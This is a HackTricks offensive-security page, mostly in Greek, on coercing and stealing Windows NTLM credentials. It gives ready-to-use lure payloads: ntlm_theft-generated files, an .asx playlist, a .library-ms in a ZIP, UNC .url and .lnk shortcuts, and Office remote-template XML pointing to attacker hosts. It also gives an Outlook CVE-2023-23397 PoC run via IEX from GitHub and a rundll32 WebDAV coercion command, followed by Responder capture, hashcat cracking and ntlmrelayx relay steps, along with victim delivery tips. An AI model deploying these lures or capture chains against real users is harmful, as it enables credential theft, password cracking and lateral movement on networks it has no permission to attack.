# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις σπουδαίες ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) από το download ενός αρχείου microsoft word online μέχρι τις πηγές ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Αν μπορείτε να **γράψετε σε ένα share που οι χρήστες ή τα scheduled jobs περιηγούνται στο Explorer**, τοποθετήστε αρχεία των οποίων τα metadata δείχνουν στο UNC σας (π.χ. `\\ATTACKER\share`). Η εμφάνιση του folder ενεργοποιεί **implicit SMB authentication** και διαρρέει ένα **NetNTLMv2** στον listener σας.

1. **Generate lures** (καλύπτει SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Αποθέστε τα στο writable share** (οποιονδήποτε φάκελο ανοίγει το θύμα):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Τα Windows μπορεί να προσπελάσουν πολλά αρχεία ταυτόχρονα· οτιδήποτε κάνει preview το Explorer (`BROWSE TO FOLDER`) δεν απαιτεί clicks.

### Windows Media Player playlists (.ASX/.WAX)

Αν μπορείς να κάνεις ένα target να ανοίξει ή να κάνει preview ένα Windows Media Player playlist που ελέγχεις, μπορείς να leak Net‑NTLMv2 δείχνοντας το entry σε ένα UNC path. Το WMP θα προσπαθήσει να ανακτήσει το referenced media μέσω SMB και θα authenticate implicitly.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Συλλογή και cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Το Windows Explorer χειρίζεται με μη ασφαλή τρόπο τα .library-ms files όταν ανοίγονται απευθείας μέσα από ένα ZIP archive. Αν το library definition δείχνει σε ένα remote UNC path (π.χ. \\attacker\share), το απλό browsing/launching του .library-ms μέσα στο ZIP κάνει το Explorer να enumerate το UNC και να εκπέμψει NTLM authentication προς τον attacker. Αυτό δίνει ένα NetNTLMv2 που μπορεί να crack offline ή potentially relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Λειτουργικά βήματα
- Δημιούργησε το αρχείο .library-ms με το XML παραπάνω (ρύθμισε το IP/hostname σου).
- Κάν’ το zip (στα Windows: Send to → Compressed (zipped) folder) και παράδωσέ το ZIP στον στόχο.
- Τρέξε έναν NTLM capture listener και περίμενε το θύμα να ανοίξει το .library-ms από μέσα στο ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Το Microsoft Outlook για Windows επεξεργαζόταν την extended MAPI property PidLidReminderFileParameter στα calendar items. Αν αυτή η property δείχνει σε UNC path (π.χ., \\attacker\share\alert.wav), το Outlook θα επικοινωνούσε με το SMB share όταν ενεργοποιούνταν το reminder, διαρρέοντας το Net‑NTLMv2 του χρήστη χωρίς κανένα click. Αυτό διορθώθηκε στις 14 Μαρτίου 2023, αλλά παραμένει ιδιαίτερα σχετικό για legacy/untouched fleets και για historical incident response.

Γρήγορη exploitation με PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Πλευρά Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Σημειώσεις
- Ένα θύμα χρειάζεται μόνο το Outlook for Windows να εκτελείται όταν ενεργοποιείται η υπενθύμιση.
- Το leak αποδίδει Net‑NTLMv2 κατάλληλο για offline cracking ή relay (όχι pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Το Windows Explorer αποδίδει αυτόματα τα shortcut icons. Πρόσφατη έρευνα έδειξε ότι ακόμη και μετά το patch του Microsoft τον Απρίλιο 2025 για UNC‑icon shortcuts, εξακολουθούσε να είναι δυνατό να ενεργοποιηθεί NTLM authentication χωρίς clicks, φιλοξενώντας το shortcut target σε UNC path και κρατώντας το icon τοπικό (το patch bypass έλαβε την ονομασία CVE-2025-50154). Το απλό viewing του folder κάνει το Explorer να ανακτήσει metadata από το remote target, εκπέμποντας NTLM στον SMB server του attacker.

Ελάχιστο Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload του Program Shortcut (.lnk) μέσω PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 δείχνει ένα parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Γιατί αυτό είναι χρήσιμο:
- Εναντίον ενός **attacker-controlled WebDAV server**, μπορεί να ενεργοποιήσει **NTLM over HTTP** χωρίς να ρίξει custom client.
- Εναντίον **internal hosts**, είναι ένας αθόρυβος τρόπος να **επικυρώσεις πού γίνονται αποδεκτά τα stolen credentials** πριν κινηθείς lateral.
- Η εντολή είναι μια καλή εναλλακτική όταν το **SMB egress is filtered** αλλά το **HTTP/WebDAV** είναι ακόμη reachable.

Operational notes:
- Η υπηρεσία **WebClient** πρέπει να τρέχει στο source host.
- Το `rundll32.exe` φορτώνει το `davclnt.dll` και κάνει τα Windows να χειριστούν το WebDAV authentication χρησιμοποιώντας τα **current user's credentials**.
- Αν το κατευθύνεις σε infrastructure που ελέγχεις, χρησιμοποίησε έναν NTLM-aware HTTP listener/relay όπως:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Από την οπτική της ανίχνευσης, οι επαναλαμβανόμενες εκτελέσεις `rundll32.exe davclnt.dll,DavSetCookie` εναντίον πολλών εσωτερικών συστημάτων είναι ισχυρή ένδειξη για **credential validation / spray-like lateral movement prep** και όχι για φυσιολογική συμπεριφορά χρήστη.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Τα Office documents μπορούν να αναφέρονται σε ένα external template. Αν ορίσεις το attached template σε ένα UNC path, το άνοιγμα του document θα πραγματοποιήσει authentication στο SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml και πρόσθεσε το attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Επεξεργαστείτε το word/_rels/settings.xml.rels και δείξτε το rId1337 στο UNC σας:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ξανασυσκεύασε σε .docx και παράδωσέ το. Τρέξε τον SMB capture listener σου και περίμενε το open.

Για ιδέες μετά το capture σχετικά με relay ή abuse του NTLM, δες:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE-2025-24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
